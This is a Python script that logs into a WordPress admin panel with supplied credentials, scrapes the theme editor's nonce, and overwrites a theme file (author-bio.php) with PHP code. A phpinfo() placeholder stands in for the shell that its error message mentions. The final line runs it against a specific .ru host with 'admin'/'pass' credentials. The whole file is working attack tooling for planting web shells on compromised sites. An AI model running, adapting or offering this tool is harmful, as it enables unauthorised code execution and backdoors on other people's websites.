#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import requests
import lxml.html
import os

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'ru-ru,ru;q=0.8,en-us;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'DNT': '1'
}

'''for i in range(100):
    time.sleep(1)
    sys.stdout.write("\r%d%%" % i)
    sys.stdout.flush()'''
def upload(string):
    s = requests.Session()
    t = string.split()
    cms = t[0]
    if int(cms) == 0:
        payload = {
            'log':t[1],
            'pwd':t[2],
            #'wp-submit': 'Log+In',
            'rememberme': 'forever',
            'redirect_to': 'http://'+t[3]+'/wp-admin',
            'testcookie': '1'
        }
        #print('log '+t[1]+' pass '+t[2]+' host '+t[3])
        url = 'http://'+t[3]+'/wp-login.php'
        print(url)
        response = requests.get(url, headers=headers, timeout = 10, allow_redirects=False)        
        #print(response.status_code)
        if (response.status_code) == 200:
            #s = requests.Session()
            try:    
                s.post(url, data=payload, headers=headers, timeout = 10)
            except Exception:
                print('ERROR')
                return False
            response = s.get('http://'+t[3]+'/wp-admin/theme-editor.php', headers=headers, timeout = 10)
            if response.text.find('action=lostpassword')<0 and response.text.find('action=logout')>0:
#-----------------------------------------------------------------------
                parsed = lxml.html.fromstring(response.text)
                links = parsed.xpath("//input[@value]")
                #print(links)
                list = []
                for i in links:
                    #print(i.attrib['value'])
                    list.append(i.attrib['value'])
                    #print(list)
                '''for i in links:
                    #print(i.attrib['name'])
                    cod = (i.attrib['name'])
                    #print(cod)'''
                wpnonce = list[1]
                print(wpnonce)
                payload = {
                    '_wpnonce':wpnonce,
                    '_wp_http_referer':'/wp-admin/theme-editor.php?file=author-bio.php&theme=twentythirteen',
                    'newcontent':'<?php phpinfo(); ?>',
                    'action':'update',
                    'file':'author-bio.php',
                    'theme':'twentythirteen',
                    'scrollto':'0',
                    'docs-list':'',
                    'submit':'Обновить файл'
                }
                try:
                    response = s.post('http://'+t[3]+'/wp-admin/theme-editor.php', data=payload, headers=headers, timeout = 10)
                    print(response)                                                                                                                                                                                                                                                                                                                                                                    
                except Exception:
                    print('Error while upload shell...')
            else:
                print('Login failed...')
                return False
upload('0 admin pass tw1ns.mysit.ru')
